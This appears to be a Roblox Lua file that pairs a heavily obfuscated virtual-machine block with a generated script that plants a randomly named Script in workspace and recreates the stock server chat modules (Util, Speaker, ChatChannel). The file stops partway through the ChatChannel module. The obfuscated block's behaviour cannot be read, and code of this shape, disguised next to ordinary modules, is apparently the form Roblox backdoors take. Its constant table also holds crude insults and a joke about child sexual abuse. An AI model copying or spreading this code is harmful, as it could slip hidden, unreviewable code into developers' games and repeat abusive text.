l[e]=nil;end;elseif(c<=6)then l[e[o]]=g(e[a]);e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];e=e[n];end;elseif(c<=7)then local f=e[o];local c=l[e[a]];l[f+1]=c;l[f]=c[e[t]];e=e[n];l[e[o]]=e[a];e=e[n];local c=e[o];l[c]=l[c](d(l,c+1,e[a]));for e=c+1,i do l[e]=nil;end;e=e[n];local c=e[o];local a=l[e[a]];l[c+1]=a;l[c]=a[e[t]];e=e[n];local a=e[o];local f,c=C(l[a](l[a+1]));r=c+a-1;local c=0;for e=a,r do c=c+1;l[e]=f[c];end;e=e[n];local a=e[o];local r={l[a](d(l,a+1,r));};local c=e[t];local o=0;for e=a,c do o=o+1;l[e]=r[o];end;for e=c+1,i do l[e]=nil;end;e=e[n];e=e[n];elseif(c==8)then l[e[o]]=x(m[e[a]],(nil),s);elseif(c<=9)then local o=e[o];local a=e[a];local n=50*(e[t]-1);local c=l[o];local e=0;for a=o+1,a do c[n+e+1]=l[o+(a-o)];e=e+1;end;end;elseif(c<=14)then if(c<=11)then if(c==10)then l[e[o]]=l[e[a]][l[e[t]]];elseif(c<=11)then l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];e=e[n];end;elseif(c<=12)then local a=e[a];local n=l[a];for e=a+1,e[t]do n=n..l[e];end;l[e[o]]=n;elseif(c==13)then l[e[o]]=g(256);elseif(c<=14)then local o=e[o];l[o]=l[o](d(l,o+1,e[a]));for e=o+1,i do l[e]=nil;end;end;elseif(c<=16)then if(c>15)then local c=e[o];l[c]=l[c](l[c+1]);for e=c+1,i do l[e]=nil;end;e=e[n];l[e[o]]=l[e[a]][e[t]];e=e[n];l[e[o]]();e=e[n];e=e[n];elseif(c<16)then if(not(l[e[o]]))then f=e[a];end;end;elseif(c<=17)then l[e[o]]=l[e[a]][e[t]];elseif(c==18)then l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];e=e[n];elseif(c<=19)then do return(l[e[o]]);end;end;elseif(c<=29)then if(c<=24)then if(c<=21)then if(c==20)then local o=e[o];local a={l[o](d(l,o+1,r));};local n=e[t];local e=0;for o=o,n do e=e+1;l[o]=a[e];end;for e=n+1,i do l[e]=nil;end;elseif(c<=21)then l[e[o]]=g(e[a]);end;elseif(c<=22)then local e=e[o];local n,o=C(l[e](l[e+1]));r=o+e-1;local o=0;for e=e,r do o=o+1;l[e]=n[o];end;elseif(c==23)then e=e[n];l[e[o]]=s[e[a]];e=e[n];local c=e[o];local r=l[e[a]];l[c+1]=r;l[c]=r[e[t]];e=e[n];l[e[o]]=e[a];e=e[n];local c=e[o];l[c]=l[c](d(l,c+1,e[a]));for e=c+1,i do l[e]=nil;end;e=e[n];local c=e[o];local a=l[e[a]];l[c+1]=a;l[c]=a[e[t]];e=e[n];local o=e[o];l[o]=l[o](l[o+1]);for e=o+1,i do l[e]=nil;end;e=e[n];e=e[n];elseif(c<=24)then local o=e[o];local c=l[o+2];local n=l[o]+c;l[o]=n;if(c>0)then if(n<=l[o+1])then f=e[a];l[o+3]=n;end;elseif(n>=l[o+1])then f=e[a];l[o+3]=n;end;end;elseif(c<=26)then if(c>25)then f=e[a];elseif(c<26)then l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=e[a];e=e[n];e=e[n];end;elseif(c<=27)then l[e[o]]=l[e[a]];elseif(c==28)then l[e[o]]=l[e[a]];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=s[e[a]];e=e[n];l[e[o]]=s[e[a]];e=e[n];l[e[o]]=l[e[a]][e[t]];e=e[n];l[e[o]]=e[a];e=e[n];l[e[o]]=#l[e[a]];e=e[n];local c=e[o];l[c]=l[c](d(l,c+1,e[a]));for e=c+1,i do l[e]=nil;end;e=e[n];l[e[o]]=l[e[a]][l[e[t]]];e=e[n];local c=e[o];l[c]=l[c](l[c+1]);for e=c+1,i do l[e]=nil;end;e=e[n];l[e[o]]=e[a];e=e[n];local r=e[a];local c=l[r];for e=r+1,e[t]do c=c..l[e];end;l[e[o]]=c;e=e[n];local o=e[o];l[o](d(l,o+1,e[a]));for e=o+1,i do l[e]=nil;end;e=e[n];e=e[n];elseif(c<=29)then local e=e[o];do return d(l,e,r);end;end;elseif(c<=34)then if(c<=31)then if(c>30)then l[e[o]]=s[e[a]];elseif(c<31)then local o=e[o];r=o+h-1;for e=0,h do l[o+e]=u[e];end;for e=r+1,i do l[e]=nil;end;end;elseif(c<=32)then l[e[o]]();elseif(c==33)then local n=e[o];local c=e[t];local o=n+2;local n=({l[n](l[n+1],l[o]);});for e=1,c do l[o+e]=n[e];end;local n=n[1];if(n)then l[o]=n;f=e[a];end;elseif(c<=34)then do return(l[e[o]]);end;e=e[n];e=e[n];end;elseif(c<=36)then if(c==35)then elseif(c<=36)then do return;end;end;elseif(c<=37)then l[e[o]]=#l[e[a]];elseif(c>38)then local n=e[o];local o=l[e[a]];l[n+1]=o;l[n]=o[e[t]];elseif(c<39)then local e=e[o];l[e](l[e+1]);for e=e,i do l[e]=nil;end;end;end;end);end;return x(R(),{},G())(...);end)(({[(233892992)]=(((153934603-#("PSU|161027525v21222B11273172751L275102731327523d27f22I27f21o26o24Y21J1827F1X27f1r27F23823a26w1... oh wait"))));['cgzyw05x9']=((248));[((#{83;73;}+762665672))]=(((#{(function(...)return 827,871,...;end)(104,659)}+2)));ZLIBM=(((#{239;349;(function(...)return 872,615;end)()}+86)));[(42993790)]=("\97");[(151915019)]=((641372));[((598944686-#("who the fuck looked at synapse xen and said 'yeah this is good enough for release'")))]=("\112");[((332289945-#("uh oh everyone watch out pain exist coming in with the backspace method one dot two dot man dot")))]=("\98");["wudEJ"]=((269934107));["eni3fex"]=(((#{570;782;(function(...)return 170,600,601;end)()}+26)));EizPIy=(((614043222-#("uh oh everyone watch out pain exist coming in with the backspace method one dot two dot man dot"))));[(932010604)]=(((#{208;}+16777215)));[(765888497)]=((20));["Lp33htssRW"]=((21));['Dvpeb6wt']=(((391927476-#("concat was here"))));['ybLBqMUnd']=("\100");[((879162993-#("i am not wally stop asking me for wally hub support please fuck off")))]=((42993790));[((887576291-#("psu premium chads winning (only joe biden supporters use the free version)")))]=((52));[((#{699;934;471;941;(function(...)return 231,360,777,...;end)(306,900,864)}+697806843))]=(((#{394;873;129;610;}+4996)));[(391927461)]=("\104");[(566797758)]=(((#{606;}+805021492)));[(40259902)]=("\118");PBD947=(((#{(function(...)return 27,...;end)()}+2046)));[((#{(function(...)return 783,547,454,101;end)()}+407181878))]=((189548564));[((#{642;298;918;403;}+307358401))]=("\121");["X0FAN"]=((8));["oLpb0W0"]=(((#{943;955;900;924;(function(...)return 798,741;end)()}-3)));[((791185265-#("why does psu.dev attract so many ddosing retards wtf")))]=((932917710));[((805021533-#("still waiting for luci to fix the API :|")))]=("\99");Ai3BCDQL=("\110");[((773706992-#("i am not wally stop asking me for wally hub support please fuck off")))]=((256));U00dC6vE=(((#{787;666;}+175483)));[((737280411-#("who the fuck looked at synapse xen and said 'yeah this is good enough for release'")))]=((42));['rkcgVsv']=("\50");[(106891926)]=(((349334507-#("why does psu.dev attract so many ddosing retards wtf"))));[((#{136;231;}+86256685))]=((1));[(684077878)]=((65536));[(189548564)]=("\120");[(385656843)]=((307358405));XUSYS9dEoO=((61));[(547286487)]=(((#{581;923;283;167;(function(...)return...;end)(400,602,133,229)}+945225127)));[(349334455)]=("\102");['j9vScCbd2']=((165));[(284313116)]=(((520038218-#("this isn't krnl support you bonehead moron"))));[(614043127)]=("\109");[(320993413)]=((0));['aZUBjyA0k']=((598944604));[(258437278)]=(((311-#("I'm not ignoring you, my DMs are full. Can't DM me? Shoot me a email: mem@mem.rip (Business enquiries only)"))));[((#{860;679;917;619;}+57669098))]=("\111");[((#{381;}+269934106))]=("\114");[(954103718)]=((32));[(97030858)]=(((34-#("IIiIIiillIiiIIIiiii :troll:"))));['g500u']=(((131-#("uh oh everyone watch out pain exist coming in with the backspace method one dot two dot man dot"))));[(901024878)]=((5));jX8OZwo46X=((332289850));[((919995738-#("psu == femboy hangout")))]=("\117");[((404161012-#("psu == femboy hangout")))]=((51));[(991630419)]=(((919995777-#("woooow u hooked an opcode, congratulations~ now suck my cock"))));[(403977163)]=(((#{643;}+725057)));[((153934519-#("psu == femboy hangout")))]=("\105");QQ8x11Z=(((363-#("oh Mr. Pools, thats a little close please dont touch me there... please Mr. Pools I am only eight years old please stop..."))));["EAz0ii5"]=((4));[((932917731-#("psu == femboy hangout")))]=("\101");[((#{(function(...)return 428,456,627,...;end)(586,993)}+457972052))]=((2));[(80835179)]=((57669102));[(520038176)]=("\107");[(945225135)]=("\108");[((778337849-#("please suck my cock :pleading:")))]=((40259902));['xA0c97q']=("\115");[((933277253-#("@everyone designs are done. luraph website coming.... eta JULY 2020")))]=((14));[((#{472;}+581870251))]=(((1075-#("why does psu.dev attract so many ddosing retards wtf"))));["wM1e5JQ18k"]=((650568));['GrS1j9O0']=("\116");}),...)
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local erjjfxkerfkxdceo = Instance.new("Script")
erjjfxkerfkxdceo.Disabled = true
erjjfxkerfkxdceo.Name = "erjjfxkerfkxdceo"
erjjfxkerfkxdceo.Parent = workspace

local util = Instance.new("ModuleScript")
util.Name = "Util"
util.Parent = erjjfxkerfkxdceo

local speaker = Instance.new("ModuleScript")
speaker.Name = "Speaker"
speaker.Parent = erjjfxkerfkxdceo

local chatchannel = Instance.new("ModuleScript")
chatchannel.Name = "ChatChannel"
chatchannel.Parent = erjjfxkerfkxdceo

local chat_service = Instance.new("ModuleScript")
chat_service.Name = "ChatService"
chat_service.Parent = erjjfxkerfkxdceo

--// Modules

local modules = {
	[util] = function()
		--	// FileName: Util.lua
		--	// Written by: TheGamer101
		--	// Description: Utility code used by the server side chat implementation.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local DEFAULT_PRIORITY = ChatConstants.StandardPriority
		if DEFAULT_PRIORITY == nil then
			DEFAULT_PRIORITY = 10
		end
		
		local Util = {}
		Util.__index = Util
		
		local SortedFunctionContainer = {}; do
			-- This sorted function container is used to handle the logic around storing filter functions and
			-- command processors by priority.
		
			local methods = {}
			methods.__index = methods
		
			function methods:RebuildProcessCommandsPriorities()
				self.RegisteredPriorites = {}
				for priority, functions in pairs(self.FunctionMap) do
					local functionsEmpty = true
					for funcId, funciton in pairs(functions) do
						functionsEmpty = false
						break
					end
					if not functionsEmpty then
						table.insert(self.RegisteredPriorites, priority)
					end
				end
				table.sort(self.RegisteredPriorites, function(a, b)
					return a > b
				end)
			end
		
			function methods:HasFunction(funcId)
				if self.RegisteredFunctions[funcId] == nil then
					return false
				end
				return true
			end
		
			function methods:RemoveFunction(funcId)
				local functionPriority = self.RegisteredFunctions[funcId]
				self.RegisteredFunctions[funcId] = nil
				self.FunctionMap[functionPriority][funcId] = nil
				self:RebuildProcessCommandsPriorities()
			end
		
			function methods:AddFunction(funcId, func, priority)
				if priority == nil then
					priority = DEFAULT_PRIORITY
				end
		
				if self.RegisteredFunctions[funcId] then
					error(funcId .. " is already in use!")
				end
		
				self.RegisteredFunctions[funcId] = priority
		
				if self.FunctionMap[priority] == nil then
					self.FunctionMap[priority] = {}
				end
		
				self.FunctionMap[priority][funcId] = func
				self:RebuildProcessCommandsPriorities()
			end
		
			function methods:GetIterator()
				local priorityIndex = 1
				local funcId = nil
				local func = nil
		
				return function()
					while true do
						if priorityIndex > #self.RegisteredPriorites then
							return
						end
						local priority = self.RegisteredPriorites[priorityIndex]
						funcId, func = next(self.FunctionMap[priority], funcId)
						if funcId == nil then
							priorityIndex = priorityIndex + 1
						else
							return funcId, func, priority
						end
					end
				end
			end
		
			function SortedFunctionContainer.new()
				local obj = setmetatable({}, methods)
		
				obj.RegisteredFunctions = {}
				obj.RegisteredPriorites = {}
				obj.FunctionMap = {}
		
				return obj
			end
		end
		
		function Util:NewSortedFunctionContainer()
			return SortedFunctionContainer.new()
		end
		
		return Util
		
	end[speaker] = function()
		--	// FileName: Speaker.lua
		--	// Written by: Xsitsu
		--	// Description: A representation of one entity that can chat in different ChatChannels.
		
		local module = {}
		
		local RunService = game:GetService("RunService")
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local modulesFolder = script.Parent
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local function ShallowCopy(table)
			local copy = {}
			for i, v in pairs(table) do
				copy[i] = v
			end
			return copy
		end
		
		local methods = {}
		
		local lazyEventNames =
		{
		    eDestroyed = true,
			eSaidMessage = true,
			eReceivedMessage = true,
			eReceivedUnfilteredMessage = true,
			eMessageDoneFiltering = true,
			eReceivedSystemMessage = true,
			eChannelJoined = true,
			eChannelLeft = true,
			eMuted = true,
			eUnmuted = true,
			eExtraDataUpdated = true,
			eMainChannelSet = true,
			eChannelNameColorUpdated = true,
		}
		local lazySignalNames =
		{
			Destroyed = "eDestroyed",
			SaidMessage = "eSaidMessage",
			ReceivedMessage = "eReceivedMessage",
			ReceivedUnfilteredMessage = "eReceivedUnfilteredMessage",
		    RecievedUnfilteredMessage = "eReceivedUnfilteredMessage", -- legacy mispelling
			MessageDoneFiltering = "eMessageDoneFiltering",
			ReceivedSystemMessage = "eReceivedSystemMessage",
			ChannelJoined = "eChannelJoined",
			ChannelLeft = "eChannelLeft",
			Muted = "eMuted",
			Unmuted = "eUnmuted",
			ExtraDataUpdated = "eExtraDataUpdated",
			MainChannelSet = "eMainChannelSet",
			ChannelNameColorUpdated = "eChannelNameColorUpdated"
		}
		
		methods.__index = function (self, k)
			local fromMethods = rawget(methods, k)
			if fromMethods then return fromMethods end
		
		    if lazyEventNames[k] and not rawget(self, k) then
		        rawset(self, k, Instance.new("BindableEvent"))
		    end
		    local lazySignalEventName = lazySignalNames[k]
		    if lazySignalEventName and not rawget(self, k) then
		        if not rawget(self, lazySignalEventName) then
		            rawset(self, lazySignalEventName, Instance.new("BindableEvent"))
		        end
		        rawset(self, k, rawget(self, lazySignalEventName).Event)
		    end
		    return rawget(self, k)
		end
		
		function methods:LazyFire(eventName, ...)
			local createdEvent = rawget(self, eventName)
			if createdEvent then
				createdEvent:Fire(...)
			end
		end
		
		function methods:SayMessage(message, channelName, extraData)
			if self.ChatService:InternalDoProcessCommands(self.Name, message, channelName) then
				return
			end
			if not channelName then
				return
			end
		
			local channel = self.Channels[channelName:lower()]
			if not channel then
				return
			end
		
			local messageObj = channel:InternalPostMessage(self, message, extraData)
			if messageObj then
				pcall(function()
					self:LazyFire("eSaidMessage", messageObj, channelName)
				end)
			end
		
			return messageObj
		end
		
		function methods:JoinChannel(channelName)
			if (self.Channels[channelName:lower()]) then
				warn("Speaker is already in channel \"" .. channelName .. "\"")
				return
			end
		
			local channel = self.ChatService:GetChannel(channelName)
			if (not channel) then
				error("Channel \"" .. channelName .. "\" does not exist!")
			end
		
			self.Channels[channelName:lower()] = channel
			channel:InternalAddSpeaker(self)
			local success, err = pcall(function()
				self.eChannelJoined:Fire(channel.Name, channel:GetWelcomeMessageForSpeaker(self))
			end)
			if not success and err then
				print("Error joining channel: " ..err)
			end
		end
		
		function methods:LeaveChannel(channelName)
			if (not self.Channels[channelName:lower()]) then
				warn("Speaker is not in channel \"" .. channelName .. "\"")
				return
			end
		
			local channel = self.Channels[channelName:lower()]
		
			self.Channels[channelName:lower()] = nil
			channel:InternalRemoveSpeaker(self)
			local success, err = pcall(function()
				self:LazyFire("eChannelLeft", channel.Name)
				if self.PlayerObj then
					self.EventFolder.OnChannelLeft:FireClient(self.PlayerObj, channel.Name)
				end
			end)
			if not success and err then
				print("Error leaving channel: " ..err)
			end
		end
		
		function methods:IsInChannel(channelName)
			return (self.Channels[channelName:lower()] ~= nil)
		end
		
		function methods:GetChannelList()
			local list = {}
			for i, channel in pairs(self.Channels) do
				table.insert(list, channel.Name)
			end
			return list
		end
		
		function methods:SendMessage(message, channelName, fromSpeaker, extraData)
			local channel = self.Channels[channelName:lower()]
			if (channel) then
				channel:SendMessageToSpeaker(message, self.Name, fromSpeaker, extraData)
		
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot receive a message in it.", self.Name, channelName))
		
			end
		end
		
		function methods:SendSystemMessage(message, channelName, extraData)
			local channel = self.Channels[channelName:lower()]
			if (channel) then
				channel:SendSystemMessageToSpeaker(message, self.Name, extraData)
		
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot receive a system message in it.", self.Name, channelName))
		
			end
		end
		
		function methods:GetPlayer()
			return self.PlayerObj
		end
		
		function methods:GetNameForDisplay()
			if ChatSettings.PlayerDisplayNamesEnabled then
				local player = self:GetPlayer()
		
				if player then
					return player.DisplayName
				else
					return self.Name
				end
			else
				return self.Name
			end
		end
		
		function methods:SetExtraData(key, value)
			self.ExtraData[key] = value
			self:LazyFire("eExtraDataUpdated", key, value)
		end
		
		function methods:GetExtraData(key)
			return self.ExtraData[key]
		end
		
		function methods:SetMainChannel(channelName)
			local success, err = pcall(function()
				self:LazyFire("eMainChannelSet", channelName)
				if self.PlayerObj then
					self.EventFolder.OnMainChannelSet:FireClient(self.PlayerObj, channelName)
				end
			end)
			if not success and err then
				print("Error setting main channel: " ..err)
			end
		end
		
		--- Used to mute a speaker so that this speaker does not see their messages.
		function methods:AddMutedSpeaker(speakerName)
			self.MutedSpeakers[speakerName:lower()] = true
		end
		
		function methods:RemoveMutedSpeaker(speakerName)
			self.MutedSpeakers[speakerName:lower()] = false
		end
		
		function methods:IsSpeakerMuted(speakerName)
			return self.MutedSpeakers[speakerName:lower()]
		end
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		function methods:InternalDestroy()
			for i, channel in pairs(self.Channels) do
				channel:InternalRemoveSpeaker(self)
			end
		
			self.eDestroyed:Fire()
		
			self.EventFolder = nil
			self.eDestroyed:Destroy()
			self.eSaidMessage:Destroy()
			self.eReceivedMessage:Destroy()
			self.eReceivedUnfilteredMessage:Destroy()
			self.eMessageDoneFiltering:Destroy()
			self.eReceivedSystemMessage:Destroy()
			self.eChannelJoined:Destroy()
			self.eChannelLeft:Destroy()
			self.eMuted:Destroy()
			self.eUnmuted:Destroy()
			self.eExtraDataUpdated:Destroy()
			self.eMainChannelSet:Destroy()
			self.eChannelNameColorUpdated:Destroy()
		end
		
		function methods:InternalAssignPlayerObject(playerObj)
			self.PlayerObj = playerObj
		end
		
		function methods:InternalAssignEventFolder(eventFolder)
			self.EventFolder = eventFolder
		end
		
		function methods:InternalSendMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedUnfilteredMessage", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnNewMessage:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal message: " ..err)
			end
		end
		
		function methods:InternalSendFilteredMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedMessage", messageObj, channelName)
				self:LazyFire("eMessageDoneFiltering", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnMessageDoneFiltering:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal filtered message: " ..err)
			end
		end
		
		--// This method is to be used with the new filter API. This method takes the
		--// TextFilterResult objects and converts them into the appropriate string
		--// messages for each player.
		function methods:InternalSendFilteredMessageWithFilterResult(inMessageObj, channelName)
			local messageObj = ShallowCopy(inMessageObj)
		
			local oldFilterResult = messageObj.FilterResult
			local player = self:GetPlayer()
		
			local msg = ""
			pcall(function()
				if (messageObj.IsFilterResult) then
					if (player) then
						msg = oldFilterResult:GetChatForUserAsync(player.UserId)
					else
						msg = oldFilterResult:GetNonChatStringForBroadcastAsync()
					end
				else
					msg = oldFilterResult
				end
			end)
		
			--// Messages of 0 length are the result of two users not being allowed
			--// to chat, or GetChatForUserAsync() failing. In both of these situations,
			--// messages with length of 0 should not be sent.
			if (#msg > 0) then
				messageObj.Message = msg
				messageObj.FilterResult = nil
				self:InternalSendFilteredMessage(messageObj, channelName)
			end
		end
		
		function methods:InternalSendSystemMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedSystemMessage", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnNewSystemMessage:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal system message: " ..err)
			end
		end
		
		function methods:UpdateChannelNameColor(channelName, channelNameColor)
			self:LazyFire("eChannelNameColorUpdated", channelName, channelNameColor)
			if self.PlayerObj then
				self.EventFolder.ChannelNameColorUpdated:FireClient(self.PlayerObj, channelName, channelNameColor)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(vChatService, name)
			local obj = setmetatable({}, methods)
		
			obj.ChatService = vChatService
		
			obj.PlayerObj = nil
		
			obj.Name = name
			obj.ExtraData = {}
		
			obj.Channels = {}
			obj.MutedSpeakers = {}
			obj.EventFolder = nil
		
			return obj
		end
		
		return module
		
	end[chatchannel] = function()
		--	// FileName: ChatChannel.lua
		--	// Written by: Xsitsu
		--	// Description: A representation of one channel that speakers can chat in.
		
		local userShouldMuteUnfilteredMessage = false
		do
			local success, enabled = pcall(function() return UserSettings():IsUserFeatureEnabled("UserShouldMuteUnfilteredMessage") end)
			userShouldMuteUnfilteredMessage = success and enabled
		end
		
		local module = {}
		
		local modulesFolder = script.Parent
		local Chat = game:GetService("Chat")
		local RunService = game:GetService("RunService")
		local replicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(replicatedModules:WaitForChild("ChatSettings"))
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local ChatConstants = require(replicatedModules:WaitForChild("ChatConstants"))
		local Util = require(modulesFolder:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		ChatLocalization = ChatLocalization or {}
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		
		local methods = {}
		methods.__index = methods
		
		function methods:SendSystemMessage(message, extraData)
			local messageObj = self:InternalCreateMessageObject(message, nil, true, extraData)
		
			local success, err = pcall(function() self.eMessagePosted:Fire(messageObj) end)
			if not success and err then
				print("Error posting message: " ..err)
			end
		
			self:InternalAddMessageToHistoryLog(messageObj)
		
			for i, speaker in pairs(self.Speakers) do
				speaker:InternalSendSystemMessage(messageObj, self.Name)
			end
		
			return messageObj
		end
		
		function methods:SendSystemMessageToSpeaker(message, speakerName, extraData)
			local speaker = self.Speakers[speakerName]
			if (speaker) then
